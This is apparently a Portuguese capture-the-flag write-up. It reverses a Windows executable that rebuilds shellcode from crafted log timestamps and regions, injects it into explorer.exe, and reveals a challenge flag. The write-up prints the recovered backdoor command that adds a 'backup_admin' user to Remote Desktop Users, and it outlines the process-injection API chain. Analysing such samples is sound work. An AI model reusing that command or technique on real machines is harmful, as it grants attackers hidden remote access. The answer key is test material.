# CorpSyncAudit
## Resolvida Por Joaov1t

## Contexto

O desafio entrega um executável chamado `CorpSyncAudit.exe` e vários arquivos de log.

O enunciado informa que existe um caminho oculto dentro do parser de logs e que um arquivo especialmente criado consegue ativá-lo.

Na prática, precisamos:

1. Comparar os logs;
2. Encontrar o arquivo anômalo;
3. Analisar o executável;
4. Entender como o parser transforma os registros;
5. Reconstruir o payload escondido;
6. Recuperar a flag.

---

## Identificando os arquivos

Primeiro listamos os arquivos:

```bash
ls -lh
```

Também verificamos o executável:

```bash
file CorpSyncAudit.exe
```

A saída indica:

```text
PE32+ executable for MS Windows
x86-64
GUI
```

Portanto, o arquivo é um executável Windows de 64 bits.

---

## Comparando os logs

Quase todos os logs possuem:

```text
16 linhas
aproximadamente 933 a 956 bytes
```

Porém, um arquivo é completamente diferente:

```text
sync_20260412_192364(2).log
```

Ele possui:

```text
200 linhas
aproximadamente 11.984 bytes
```

Podemos comparar com:

```bash
wc -l *.log
ls -lh *.log
```

O log anômalo também contém datas, anos e regiões muito diferentes dos outros arquivos.

Exemplos:

```text
WORLD
NORTH_AMERICA
LATIN_AMERICA
EUROPE
AFRICA_EAST
RUSSIA
OCEANIA
SUB_SAHARAN_AFRICA
```

Isso indica que os dados não são registros normais de sincronização.

O arquivo provavelmente foi construído para carregar informações escondidas dentro dos campos de data, horário e região.

---

## Analisando as strings do executável

Usamos:

```bash
strings -a -n 4 CorpSyncAudit.exe
```

O executável apresenta referências a:

```text
Region=
SYNC_TEST
127.0.0.1
4445
explorer.exe
```

O programa também resolve várias APIs do Windows de forma escondida.

Entre elas:

```text
CreateToolhelp32Snapshot
Process32First
Process32Next
OpenProcess
VirtualAllocEx
WriteProcessMemory
VirtualProtectEx
CreateRemoteThread
VirtualFreeEx
```

Essas funções revelam o comportamento malicioso.

O fluxo é equivalente a:

```text
Procurar explorer.exe
        ↓
Abrir o processo
        ↓
Alocar memória dentro dele
        ↓
Copiar um payload
        ↓
Alterar a memória para executável
        ↓
Criar uma thread remota
```

Ou seja, o programa realiza injeção de código dentro do processo `explorer.exe`.

---

## Caminho oculto do parser

O executável procura pelo texto:

```text
Region=
```

em cada linha do log.

Depois executa o seguinte processo:

1. Extrai o nome da região;
2. Calcula um hash customizado;
3. Compara o resultado com uma tabela interna;
4. Obtém o índice da região;
5. Converte esse índice em cinco bits;
6. Utiliza esses bits para alterar data e horário;
7. Empacota os valores em 32 bits;
8. Produz quatro bytes por registro;
9. Acumula todos os bytes;
10. Executa o resultado como shellcode.

Portanto, cada registro válido gera:

```text
4 bytes
```

O log malicioso produz um payload de:

```text
396 bytes
```

---

## Hash das regiões

O programa não armazena os nomes das regiões diretamente.

Em vez disso, guarda uma tabela com 32 hashes.

O hash é calculado de forma case-insensitive e utiliza:

```text
FNV-1a
rotação de 64 bits
multiplicações adicionais
```

O solver reproduz essa função para descobrir qual índice pertence a cada região.

Foram reconhecidas regiões como:

```text
WORLD
NORTH_AMERICA
SUB_SAHARAN_AFRICA
AFRICA_EAST
AFRICA_WEST
AFRICA_SOUTH
EUROPE
EU_EASTERN
LATIN_AMERICA
RUSSIA
ASIA
EAST_ASIA
OCEANIA
```

---

## Chave escondida

Durante a análise do executável, foi encontrada a chave:

```text
0xF07EC6A4
```

Em bytes:

```text
F0 7E C6 A4
```

Essa chave é usada durante a reconstrução dos quatro bytes produzidos por cada linha do log.

---

## Estrutura de cada registro

Uma linha como:

```text
Monday, 03/09/2023 15:19:39 PM UTC | Region=NORTH_AMERICA
```

contém:

```text
dia da semana
dia
mês
ano
hora
minuto
segundo
fuso horário
região
```

Os valores são empacotados da seguinte forma:

```text
hora    → 5 bits
minuto  → 6 bits
segundo → 6 bits
dia     → 5 bits
mês     → 4 bits
ano     → 6 bits
```

Total:

```text
32 bits
```

Ou seja:

```text
4 bytes por linha
```

Antes do empacotamento, alguns campos recebem XOR dependendo dos cinco bits do índice da região.

Depois, o valor final recebe XOR com:

```text
índice do dia da semana
chave F0 7E C6 A4
```

---

## Tratamento de UTC e GMT

Os registros podem utilizar:

```text
UTC
GMT
```

Quando o fuso é `GMT`, o programa aplica uma transformação adicional sobre hora, minuto e segundo.

A lógica reconstruída é equivalente a:

```python
intermediate = int(
    (hour + minute - second) / 2
)

hour = hour - intermediate
second = minute - intermediate
minute = intermediate
```

Essa operação precisa ser reproduzida corretamente para que os bytes recuperados sejam iguais aos esperados.

---

## Criando o solver

Criamos o script:

```bash
cat > solve_corpsync.py <<'PY'
#!/usr/bin/env python3

from __future__ import annotations

import argparse
import base64
import re
import struct
from pathlib import Path


MASK64 = (1 << 64) - 1

RDATA_VA = 0x14001D000
RDATA_FILE_OFFSET = 0x1B000

REGION_TABLE_VA = 0x14001D680
REGION_COUNT = 32

PAYLOAD_KEY = bytes.fromhex("f07ec6a4")

WEEKDAY_INDEX = {
    "Monday": 1,
    "Tuesday": 2,
    "Wednesday": 3,
    "Thursday": 4,
    "Friday": 5,
    "Saturday": 6,
    "Sunday": 7,
}

LINE_PATTERN = re.compile(
    r"^(\w+), "
    r"(\d+)/(\d+)/(\d+) "
    r"(\d+):(\d+):(\d+) "
    r"(AM|PM) "
    r"(UTC|GMT) "
    r"\| Region=([A-Z_]+)$"
)

REGION_PATTERN = re.compile(
    r"Region=([A-Z_]+)"
)

BASE64_PATTERN = re.compile(
    rb"[A-Za-z0-9+/]{16,}={0,2}"
)


def rotate_right_64(value, amount):
    amount &= 63

    return (
        (value >> amount)
        | (value << (64 - amount))
    ) & MASK64


def hidden_hash(text):
    value = 0xCBF29CE484222325

    for byte in text.encode():
        if 0x61 <= byte <= 0x7A:
            byte -= 0x20

        value ^= byte
        value = (
            value * 0x100000001B3
        ) & MASK64

        value = rotate_right_64(
            value,
            13,
        )

    value ^= value >> 33

    value = (
        value
        * ((-0x00AE502812AA7333) & MASK64)
    ) & MASK64

    value ^= value >> 33

    value = (
        value
        * ((-0x3B314601E57A13AD) & MASK64)
    ) & MASK64

    value ^= value >> 33

    return value & MASK64


def virtual_address_to_offset(address):
    return (
        RDATA_FILE_OFFSET
        + (address - RDATA_VA)
    )


def read_region_hashes(executable):
    offset = virtual_address_to_offset(
        REGION_TABLE_VA
    )

    return list(
        struct.unpack_from(
            f"<{REGION_COUNT}Q",
            executable,
            offset,
        )
    )


def normalize_gmt(
    hour,
    minute,
    second,
):
    intermediate = int(
        (hour + minute - second) / 2
    )

    original_minute = minute

    return (
        hour - intermediate,
        intermediate,
        original_minute - intermediate,
    )


def encode_record(
    weekday,
    day,
    month,
    year,
    hour,
    minute,
    second,
    timezone,
    region_index,
):
    if timezone == "GMT":
        hour, minute, second = normalize_gmt(
            hour,
            minute,
            second,
        )

    region_bits = f"{region_index:05b}"

    values = [
        hour,
        minute,
        second,
        day,
        month,
    ]

    masks = [
        12,
        30,
        30,
        16,
        6,
    ]

    transformed = []

    for value, mask, bit in zip(
        values,
        masks,
        region_bits,
    ):
        if bit == "1":
            value ^= mask

        transformed.append(value)

    packed = (
        (transformed[0] << 27)
        | (transformed[1] << 21)
        | (transformed[2] << 15)
        | (transformed[3] << 10)
        | (transformed[4] << 6)
        | (year - 1990)
    ) & 0xFFFFFFFF

    weekday_key = WEEKDAY_INDEX.get(
        weekday,
        1,
    )

    result = packed.to_bytes(
        4,
        "big",
    )

    result = bytes(
        byte ^ weekday_key
        for byte in result
    )

    result = bytes(
        byte ^ key
        for byte, key in zip(
            result,
            PAYLOAD_KEY,
        )
    )

    return result


def build_region_map(
    log_lines,
    region_hashes,
):
    names = {
        match.group(1)
        for line in log_lines
        if (
            match
            := REGION_PATTERN.search(line)
        )
    }

    result = {}

    for name in names:
        value = hidden_hash(name)

        try:
            result[name] = region_hashes.index(
                value
            )
        except ValueError:
            continue

    return result


def decode_payload(
    log_lines,
    region_map,
):
    output = bytearray()

    for line in log_lines:
        match = LINE_PATTERN.match(line)

        if not match:
            continue

        (
            weekday,
            day,
            month,
            year,
            hour,
            minute,
            second,
            _ampm,
            timezone,
            region,
        ) = match.groups()

        if region not in region_map:
            continue

        output.extend(
            encode_record(
                weekday=weekday,
                day=int(day),
                month=int(month),
                year=int(year),
                hour=int(hour),
                minute=int(minute),
                second=int(second),
                timezone=timezone,
                region_index=region_map[region],
            )
        )

    return bytes(output)


def find_flags(data):
    flags = set()

    for match in BASE64_PATTERN.finditer(data):
        candidate = match.group()

        try:
            decoded = base64.b64decode(
                candidate,
                validate=True,
            )
        except Exception:
            continue

        for flag in re.findall(
            rb"HTB\{[^}]+\}",
            decoded,
        ):
            flags.add(
                flag.decode(
                    "ascii",
                    errors="replace",
                )
            )

    return sorted(flags)


def main():
    parser = argparse.ArgumentParser()

    parser.add_argument(
        "executable",
        type=Path,
    )

    parser.add_argument(
        "log",
        type=Path,
    )

    parser.add_argument(
        "-o",
        "--output",
        type=Path,
        default=Path(
            "corpsync_payload.bin"
        ),
    )

    args = parser.parse_args()

    executable = args.executable.read_bytes()

    log_lines = args.log.read_text(
        encoding="utf-8",
        errors="replace",
    ).splitlines()

    region_hashes = read_region_hashes(
        executable
    )

    region_map = build_region_map(
        log_lines,
        region_hashes,
    )

    payload = decode_payload(
        log_lines,
        region_map,
    )

    args.output.write_bytes(payload)

    print(
        f"[+] Regiões reconhecidas: "
        f"{len(region_map)}"
    )

    print(
        f"[+] Payload: "
        f"{len(payload)} bytes"
    )

    print(
        f"[+] Salvo em: "
        f"{args.output}"
    )

    print(
        f"[+] Primeiros bytes: "
        f"{payload[:16].hex()}"
    )

    flags = find_flags(payload)

    if flags:
        print("[+] Flag encontrada:")

        for flag in flags:
            print(flag)


if __name__ == "__main__":
    main()
PY
```

---

## Executando o solver

Colocamos o script, o executável e o log anômalo na mesma pasta:

```bash
python3 solve_corpsync.py \
  "CorpSyncAudit.exe" \
  "sync_20260412_192364(2).log"
```

A saída foi:

```text
[+] Regiões reconhecidas: 13
[+] Payload: 396 bytes
[+] Primeiros bytes: fc4883e4f0e8c0000000415141505251
```

Os primeiros bytes:

```text
fc 48 83 e4 f0 e8 c0 00
00 00 41 51 41 50 52 51
```

indicam um shellcode x64 válido.

---

## Analisando o payload

Procuramos strings dentro do shellcode:

```bash
strings -a corpsync_payload.bin
```

Foi encontrado o seguinte comando:

```cmd
net user backup_admin SFRCe2Q0NzNfNzFtM180bmRfNjRja2QwMHI1fQ== /add && net localgroup "Remote Desktop Users" backup_admin /add
```

Esse comando:

1. Cria o usuário `backup_admin`;
2. Usa uma senha codificada em Base64;
3. Adiciona o usuário ao grupo de acesso remoto do Windows.

A sequência Base64 é:

```text
SFRCe2Q0NzNfNzFtM180bmRfNjRja2QwMHI1fQ==
```

Decodificamos com:

```bash
echo \
'SFRCe2Q0NzNfNzFtM180bmRfNjRja2QwMHI1fQ==' \
| base64 -d
```

Resultado:

```text
HTB{d473_71m3_4nd_64ckd00r5}
```

---

## Sobre o Docker

O endereço fornecido pelo desafio era:

```text
154.57.164.78:31435
```

O executável também contém uma função de teste que tenta se conectar a:

```text
127.0.0.1:4445
```

e envia:

```text
SYNC_TEST
```

Isso indica que o Docker provavelmente fornece um ambiente remoto para executar o programa ou testar o serviço local.

Porém, o Docker não foi necessário para encontrar a flag.

Toda a lógica da backdoor e o payload estavam presentes no executável e no log malicioso.

---

## Conclusão

O desafio escondia um shellcode dentro de um arquivo de log.

Cada registro do log armazenava quatro bytes utilizando:

```text
data
horário
dia da semana
fuso horário
região
```

O executável reconhecia as regiões por hashes, reconstruía os bytes e injetava o payload no processo `explorer.exe`.

O shellcode criava um usuário chamado:

```text
backup_admin
```

A senha estava em Base64 e, ao ser decodificada, revelou a flag.

O arquivo malicioso era:

```text
sync_20260412_192364(2).log
```

A flag final é:

```text
HTB{d473_71m3_4nd_64ckd00r5}
```
